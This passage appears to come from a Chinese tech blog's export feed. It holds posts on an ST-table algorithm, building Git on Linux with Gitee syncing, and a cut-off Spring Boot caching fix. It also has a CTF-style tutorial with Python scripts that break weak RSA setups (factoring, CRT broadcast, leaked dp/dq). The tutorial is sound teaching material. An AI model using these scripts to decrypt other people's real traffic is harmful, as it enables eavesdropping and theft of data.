<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][right] &#x3D; max(f[left][x], f[right - 2^x + 1][x])</span><br></pre></td></tr></table></figure>

<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><blockquote>
<p>题目来源：洛谷<a href="https://www.luogu.com.cn/problem/P3865" target="_blank" rel="noopener">【模板】ST表</a></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> f[MAX_N][<span class="number">25</span>], n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> ch = getchar();</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch))&#123;<span class="keyword">if</span> (ch==<span class="string">'-'</span>) flag = <span class="number">1</span>; ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch))&#123;sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch<span class="number">-48</span>;ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">return</span> flag ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)f[i][<span class="number">0</span>] = <span class="built_in">read</span>();</span><br><span class="line">    <span class="comment">// 2^17 &gt; 1e5</span></span><br><span class="line">    <span class="comment">// 为什么以 j 开始进行枚举 i？</span></span><br><span class="line">    <span class="comment">// 因为 j 是控制区间长度的，保证 2^j 的区间是之前就已经求好的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">17</span>; j++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i + (<span class="number">1</span> &lt;&lt; j) - <span class="number">1</span> &lt;= n; i++)&#123;</span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i][j - <span class="number">1</span>], f[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    pre();</span><br><span class="line">    <span class="keyword">int</span> l, r, xlog2, ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        l = <span class="built_in">read</span>(), r = <span class="built_in">read</span>();</span><br><span class="line">        xlog2 = log2(r - l + <span class="number">1</span>);</span><br><span class="line">        ans = <span class="built_in">max</span>(f[l][xlog2], f[r - (<span class="number">1</span> &lt;&lt; xlog2) + <span class="number">1</span>][xlog2]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>ST表</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装Git、与Windows系统关联同一个码云仓库</title>
    <url>/2020/07/06/Linux%E5%AE%89%E8%A3%85Git%E3%80%81%E4%B8%8EWindows%E7%B3%BB%E7%BB%9F%E5%85%B3%E8%81%94%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有的时候需要在云主机上跑跑程序，但是在没有图形界面的Linux系统上，利用<code>vim</code>编写代码效率还是比较低，当然可以利用<code>Xftp</code>相关的软件直接向云主机发送源程序，也可以通过邮件系统的文件中转站等其他办法。但是我发现这样子还是不太方便，为什么不利于版本控制工具，在<code>Windows</code>系统上利用<code>IDE</code>开发工具编写好代码，推送到远端仓库，在<code>Linux</code>端拉取代码，这样子不是更加方便？下面我介绍一下该方法。<a id="more"></a></p>
<p>在这之前需要注册一个<code>GitHub</code>账户或者码云账户，我这里选择的是码云</p>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>可以使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure>

<p>这样子简单快速，但是这样子安装的版本通常都是非常低的，所以我这里不使用这种方法，我们可以从<code>GitHub</code>上面找到自己喜欢的版本，下面开始我们的步骤：</p>
<ol>
<li><p>去<code>GitHub</code>上面搜索<code>git</code>，进入到<code>release</code>页面寻找自己喜欢的版本</p>
<p>然后使用下面的命令下载安装包的压缩包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://codeload.github.com/git/git/tar.gz/v2.27.0</span><br></pre></td></tr></table></figure>

<p><code>v2.27.0</code>是版本号</p>
</li>
<li><p>解包解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf v2.27.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译源码</p>
<p>解包解压完毕，就会生成<code>git-2.27.0</code>文件夹，进入该文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd git-2.27.0</span><br></pre></td></tr></table></figure>

<p>理论上说现在就可以进行编译了，但是编译过程可能会缺失相关库文件，因此建议先安装相关库文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br></pre></td></tr></table></figure>

<p>执行上面的步骤的时候，系统会安装旧版的<code>Git</code>，因此需要先删除：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove git</span><br></pre></td></tr></table></figure>

<p>开始编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git all</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置安装路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make prefix=/usr/local/git install</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置环境变量</p>
<p>打开配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure>

<p>在最下面加上：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">PATH</span>=<span class="string">$PATH:/usr/local/git/bin</span></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH</span></span><br></pre></td></tr></table></figure>

<p>刷新配置文件，使得文件生效：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>检查版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号就说明<code>Git</code>安装好了</p>
</li>
</ol>
<h2 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h2><p>配置账号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "码云注册的用户名"</span><br><span class="line">git config --global user.email "码云注册的邮箱"</span><br></pre></td></tr></table></figure>

<p>生成密钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "码云的邮箱"</span><br></pre></td></tr></table></figure>

<p>接下来按下回车键几次就可以了</p>
<p><img src="https://q.yalexin.top/%E8%B7%AF%E5%BE%84.png" alt></p>
<p>红色圈住的是密钥文件路径</p>
<p>直到出现下面的信息即可：</p>
<p><img src="https://q.yalexin.top/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5.png" alt></p>
<p>查看刚刚生成的密钥文件内容:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /root/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制上面的信息，到码云平台中的“设置”，“SSH公钥”中添加刚刚复制的信息即可</p>
<h2 id="Windows配置Git"><a href="#Windows配置Git" class="headerlink" title="Windows配置Git"></a>Windows配置Git</h2><p>这个应该不会太难，使用图形化界面安装，一直<code>next</code>即可，或者参照我的另<a href="https://www.yalexin.top/index.php/archives/22/" target="_blank" rel="noopener">一篇文章</a>。</p>
<h2 id="建立仓库"><a href="#建立仓库" class="headerlink" title="建立仓库"></a>建立仓库</h2><p>在码云网站新建一个仓库</p>
<p>在<code>Linux</code>系统的某个文件夹下依次输入以下命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">touch README.md</span><br><span class="line">git add .</span><br><span class="line">git commit -m "Linux下的提交"</span><br><span class="line">git remote add origin git@gitee.com:YaleXin/linux-windows.git # YaleXin是你的账户名字，linux-windows是你的刚刚新建的仓库</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>这样子远端仓库就会出现刚刚的<code>README.md</code>文件了</p>
<p>来到<code>Windows</code>系统端，新建一个文件夹，进入该文件夹，右键鼠标，点击<code>Git Bash Here</code>，输入下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git@gitee.com:YaleXin/linux-windows.git</span><br></pre></td></tr></table></figure>

<p>然后简单修改一下<code>README.md</code>文件</p>
<p>输入下面命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "Windows系统进行修改"</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>如果在<code>Windows</code>系统下配置好了<code>git</code>后，远端仓库就会出现新文件的内容了</p>
<p>回到<code>Linux</code>系统下，在之前的仓库所在文件夹下输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>本地仓库就会同步远端仓库的内容了。当然了有可能会产生冲突，解决冲突办法参照官网或者网上其他帖子即可。</p>
<p>这样子就算是利用远端仓库，实现云主机和本地进行互通了，后续就可以在<code>Windows</code>上利用<code>IDE</code>集成开发环境进行愉快地编程了。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA的常见攻击</title>
    <url>/2022/08/15/RSA%E7%9A%84%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>本文参考自文章<a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">【从0到1：CTFer成长之路-第7章】</a></p>
<p>上文我们介绍了RSA算法原理，只要我们设置得当，我们有足够多的理由相信我们的RSA系统是安全的，但是粗心的我们，能否禁得住黑客的攻城掠池？下面介绍一些RSA的常见攻击。<a id="more"></a></p>
<h2 id="1-因式分解"><a href="#1-因式分解" class="headerlink" title="1.因式分解"></a>1.因式分解</h2><p>产生公钥和私钥的时候，我们用到了p，q，e，我们对外公布的是p和q的乘积以及e。如果我们选用的p和q太小，很容易就被很多工具将二者的乘积进行因式分解，从而获得了p和q。</p>
<p>有很多在线工具可以将大数进行因式分解，也有一些开源工具，这里以<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">Yafu</a>为例,对于阿珍的公钥&lt;n,e&gt;=&lt;16422644908304291,65537&gt;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\HackTools\yafu-1.34&gt;yafu-x64.exe</span><br><span class="line">factor(16422644908304291)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fac: factoring 16422644908304291</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line">fmt: 1000000 iterations</span><br><span class="line">Total factoring time = 0.0058 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P9 = 134235139</span><br><span class="line">P9 = 122342369</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></table></figure>

<p>继续使用<code>python</code>的<code>Gmpy2</code>库可以很容易求逆元：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p, q, e = <span class="number">134235139</span>, <span class="number">122342369</span>, <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 求 e mod phi 的逆元</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">print(d)</span><br><span class="line"><span class="comment"># 8237257961022977</span></span><br></pre></td></tr></table></figure>

<p>此外，如果<code>p</code>和<code>q</code>的差距较小，根据下面的式子：<br>$$<br>(\frac{p+q}{2} )^2-pq=(\frac{p-q}{2} )^2<br>$$<br>直接暴力枚举<code>p</code>和<code>q</code>的差值，寻找<code>p</code>和<code>q</code></p>
<h2 id="2-低加密指数小明文攻击"><a href="#2-低加密指数小明文攻击" class="headerlink" title="2.低加密指数小明文攻击"></a>2.低加密指数小明文攻击</h2><p>如果阿强想要发送的数据很短，很简单，即明文<code>m</code>编码后，对应数学上，其数值很小，加上其公钥中的<code>e</code>很小，计算<code>m^e</code>的值并没有超过<code>n</code>，那么我们想要得到明文，直接将密文开<code>e</code>次方即可。</p>
<p>此外，如果密文<code>c</code>虽然大于<code>n</code>，但是并不是太大，由于：<br>$$<br>c\equiv m^e \pmod{n}<br>$$<br>即存在整数k，使得：<br>$$<br>c+kn=m^e<br>$$<br>我们可以直接暴力枚举<code>k</code>，然后将其开<code>e</code>次方，如果可以开得尽，则说明找到了明文<code>m</code>。</p>
<h2 id="3-共模攻击"><a href="#3-共模攻击" class="headerlink" title="3.共模攻击"></a>3.共模攻击</h2><p>如果阿珍使用了相同的<code>n</code>，不同的指数<code>e1</code>，<code>e2</code>,同时这两个指数互素，并且得到了对同一组明文加密后的密文<code>c1</code>和<code>c2</code>，在不获取私钥的情况下也能将明文解来，原理如下：</p>
<p>设：<br>$$<br>c_1=m^{e_1}\pmod{n}<br>$$<br>和<br>$$<br>c_2=m^{e_2}\pmod{n}<br>$$<br>由于<code>e1</code>和<code>e2</code>互素，存在整数x和y，使得：<br>$$<br>xe_1+ye_2=1<br>$$<br>x和y可以通过<a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414" target="_blank" rel="noopener">扩展欧几里得算法</a>求解出来。</p>
<p>进一步有：<br>$$<br>c_{1}^{x}c_{2}^{y} \pmod{n}=m^{xe_1}m^{ye_2}\pmod{n}=m^1\pmod{n}=m<br>$$<br>即可获得明文。</p>
<h2 id="4-广播攻击"><a href="#4-广播攻击" class="headerlink" title="4.广播攻击"></a>4.广播攻击</h2><p>对于相同的明文，如果阿强使用了相同的明文<code>m</code>，相同的指数<code>e</code>，但是不同的<code>n1</code>,<code>n2</code>,<code>n3</code>…<code>nh</code>(h&gt;=e)，同时暴露了对应的每个密文，可以使用中国剩余定理解出明文<code>m</code>。</p>
<p>设：<br>$$<br>\left{\begin{matrix}<br>c_1=m^e\pmod{n_1}<br> \<br>c_2=m^e\pmod{n_2}<br>\<br>…<br>\<br>c_h=m^e\pmod{n_h}<br>\end{matrix}\right.<br>$$<br>借助<a href="https://baike.sogou.com/v1853008.htm?fromTitle=%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">中国剩余定理</a>,假设<code>ni</code>两两互素，令：<br>$$<br>N=\prod_{i=1}^{h} n_i<br>$$</p>
<p>$$<br>N_i=\frac{N}{n_i}<br>$$</p>
<p>则上述同余方程组有唯一解：<br>$$<br>X=m^e\equiv\sum_{i=1}^{h} c_iN_iy_i \pmod{N}<br>$$<br>其中：<br>$$<br>N_iy_i\equiv1\pmod{n_i}<br>$$</p>
<p>例如，假设张三想要发送消息给甲乙丙三个人，张三手上也有对应的三个公钥<code>&lt;205,3&gt;&lt;187,3&gt;&lt;667,3&gt;</code>，他想发送的消息<code>m=10</code>，加密后的密文分别是180，65，333</p>
<p>这三组公钥和密文在传输过程中被李四截取，他立马写下脚本进行窃取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中国剩余定理的代码来自rosettacode Wiki</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(c,n)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ni 的乘积,N=n1*n2*n3</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x,y:x*y,n)</span><br><span class="line">    <span class="comment"># zip()将对象打包成元组</span></span><br><span class="line">    <span class="keyword">for</span> n_i, c_i <span class="keyword">in</span> zip(n,c):</span><br><span class="line">        <span class="comment"># Ni=N/ni</span></span><br><span class="line">        N_i = N // n_i</span><br><span class="line">        <span class="comment"># Ni y == 1 % ni 求逆元</span></span><br><span class="line">        y = gmpy2.invert(N_i,n_i)</span><br><span class="line">        sum += c_i * N_i * y</span><br><span class="line">    <span class="keyword">return</span> sum % N</span><br><span class="line">n1, n2, n3 = <span class="number">205</span>, <span class="number">187</span>, <span class="number">667</span></span><br><span class="line">c1, c2, c3 = <span class="number">180</span>, <span class="number">65</span>, <span class="number">333</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">x = CRT(c,n)</span><br><span class="line"><span class="comment"># 将x开e次方</span></span><br><span class="line">m = gmpy2.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>



<h2 id="5-低解密指数攻击"><a href="#5-低解密指数攻击" class="headerlink" title="5.低解密指数攻击"></a>5.低解密指数攻击</h2><p>1989年，Michael J.Wiener发表了<a href="https://ieeexplore.ieee.org/abstract/document/54902" target="_blank" rel="noopener">Cryptanalysis of Short RSA Secret Exponents</a>文章，提出了一种针对解密指数<code>d</code>较低时对于RSA的攻击方法，该方法基于连分数,设：<br>$$<br>ed=1+k \varphi(n)<br>$$<br>当q&lt;p&lt;2q时，若满足：<br>$$<br>d&lt;\frac{1}{3}  n ^{\frac{1}{4}}<br>$$<br>则通过搜索连分数e/N的收敛，可以有效率地找到k/d，从而恢复正确的d。</p>
<p>目前，对于此种攻击已有完备的实现，在<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">GitHub</a>可以找到完整可用的攻击代码</p>
<h2 id="6-dp泄露"><a href="#6-dp泄露" class="headerlink" title="6.dp泄露"></a>6.dp泄露</h2><blockquote>
<p>dp = d % (p-1)并非字面上d和p相乘</p>
</blockquote>
<p>如果已知<code>dp</code>,<code>e</code>,<code>n</code>,<code>c</code>，则可以解出明文<code>m</code>。证明如下,已知：<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>对式子（3）两边同乘<code>e</code>，有<br>$$<br>DP e\equiv de \pmod{p-1}<br>$$<br>则存在整数<code>k1</code>，使得：<br>$$<br>de=k_1(p-1)+DPe \tag{4}<br>$$<br>而<br>$$<br>de\equiv1 \pmod{\varphi(n)}<br>$$<br>即<br>$$<br>de\equiv1\pmod{(p-1)(q-1)}<br>$$<br>故存在一个整数<code>k2</code>，使得：<br>$$<br>de=k_2(p-1)(q-1)+1<br>$$<br>带入到式子（4）并整理，得到<br>$$<br>DPe=(p-1)(k_2(q-1)-k_1) + 1<br>$$<br>再令<br>$$<br>x=k_2(q-1)<br>$$<br>即<br>$$<br>DPe=(p-1)x+1<br>$$<br>解得<br>$$<br>x=\frac{DPe}{p-1}-\frac{1}{p-1}<br>$$<br>根据定义，<code>DP&lt;(p-1)</code>，因此<code>1&lt;x&lt;e</code>。</p>
<p>如果<code>e</code>不大，我们可以直接暴力枚举<code>x</code>,当其能够整除<code>DPe-1</code>时候，则<code>p</code>就可以找到了，找到以后进一步解得<code>q</code>，进一步得到<code>d</code>，从而恢复原文。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"><span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># 若存在 x ，使得 de*e - 1 能被 x 整除</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % x == <span class="number">0</span>:</span><br><span class="line">        pp = ((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span></span><br><span class="line">        <span class="comment"># 确保 p 能够整除 n</span></span><br><span class="line">        <span class="keyword">if</span> n % pp == <span class="number">0</span>:</span><br><span class="line">            p = pp</span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 求模逆</span></span><br><span class="line">            d = gmpy2.invert(e, phi)</span><br><span class="line">            m = gmpy2.powmod(c, d, n)</span><br><span class="line">            print(m)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="7-dp-dq泄露"><a href="#7-dp-dq泄露" class="headerlink" title="7. dp,dq泄露"></a>7. dp,dq泄露</h2><blockquote>
<p>dp = d % (p-1), dq = d % (q-1),并非字面上d和p相乘</p>
</blockquote>
<p>如果已知<code>dp</code>,<code>dq</code>,<code>p</code>,<code>q</code>,<code>c</code>，则可以解出明文<code>m</code>。证明如下,已知<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>$$<br>DQ = d \bmod(q-1) \tag{4}<br>$$</p>
<p>由式子（2）可得：<br>$$<br>m=c^d+kn=c^d+kpq<br>$$<br>对上式子分别对<code>p</code>和<code>q</code>取模,有：<br>$$<br>m_1 \equiv c^d \pmod{p} \tag{5}<br>$$</p>
<p>$$<br>m_2 \equiv c^d \pmod{q} \tag{6}<br>$$</p>
<p>对式子（5），话句话说，有：<br>$$<br>m_1 + kp = c^d \tag{7}<br>$$<br>即：<br>$$<br>m_1+kp \equiv c^d \pmod{q}<br>$$<br>将上式子带入式子（6），有：<br>$$<br>kp \equiv (m_2-m_1) \pmod{q}<br>$$<br>因为<code>p</code>和<code>q</code>互素，二者最大公约数为1,有：<br>$$<br>k \equiv p’(m_2-m_1) \pmod{q} \tag{8}<br>$$<br><code>p&#39;</code>是<code>p</code>关于<code>q</code>的逆元,即：<br>$$<br>pp’ \equiv1 \pmod{q}<br>$$<br>联立（7）和（8），有：<br>$$<br>c^d=m_1+((p’(m_2-m_1) )\bmod{q} )p<br>$$<br>再带入式子（2），有：<br>$$<br>m \equiv (m_1+((p’(m_2-m_1) )\bmod{q} )p )\pmod{n} \tag{9}<br>$$<br>下面我们来求<code>m1</code>和<code>m2</code>.</p>
<p>由式子（3），得：<br>$$<br>d=DP+k(p-1)<br>$$<br>将上式子（5），有：<br>$$<br>m_1 \equiv c^{DP+k(p-1)} \pmod{p}<br>$$<br>即：<br>$$<br>m_1 \equiv c^{DP}c^{k(p-1)} \pmod{p}<br>$$<br>根据费马小定理，若<code>p</code>是素数,且<code>gcd(c,p)=1</code>，则<code>c^(p-1)=1 mod p</code>。</p>
<p>即<br>$$<br>c^{k(p-1)} \pmod{p} \equiv (c^{p-1}\pmod{p})^{k}\pmod{p}\equiv1<br>$$<br>故：<br>$$<br>m_1=c^{DP} \pmod{p}<br>$$<br>同理<br>$$<br>m_2=c^{DQ} \pmod{q}<br>$$<br>将这两个式子回代到式子（9）即可求出明文。</p>
<p>使用<code>python</code>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">n = p * q</span><br><span class="line">m1 = pow(c,dp,p)</span><br><span class="line">m2 = pow(c,dq,q)</span><br><span class="line">I = gmpy2.invert(p,q)</span><br><span class="line">m = (m1 + I * ((m2 - m1) % q) * p) % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>8</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot @Cacheable 失效的解决方法</title>
    <url>/2020/07/31/Spring-Boot-Cacheable-%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>文章参考了博客园的 <strong>zhaoyue1215</strong> 用户分享的文章【<a href="https://www.cnblogs.com/zhaoyue1215/p/9267584.html" target="_blank" rel="noopener">Spring @Cacheable 缓存不生效的问题</a>】</p>
</blockquote>
<p>今天在使用<code>Spring Boot</code>的缓存时候，发现控制台一直输出<code>Hibernate</code>访问数据库时执行的<code>Sql</code>语句，<code>@EnableCaching</code>注解已经添加到主启动类中， <code>@Cacheable</code>也加到了相应的服务方法上，但是我把断点打到了<code>ConcurrentMapCacheManager</code>类中的方法<code>getCache(String name)</code>上后，测试过程发现根本就没有调用该方法，即缓存不生效！<a id="more"></a></p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>后来查阅资料发现，如果注解都正确添加，缓存不生效的可能是因为被添加<code>@Cacheable</code>的方法是在内部被其他方法，这样子是无法使用缓存的，例如说我这次情况：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 将数据库中的Blog对象取出来，将其属性content（MarkDown语法）转为HTML格式</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    Blog blog = getBlog(id)</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Cacheble</span>()</span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long 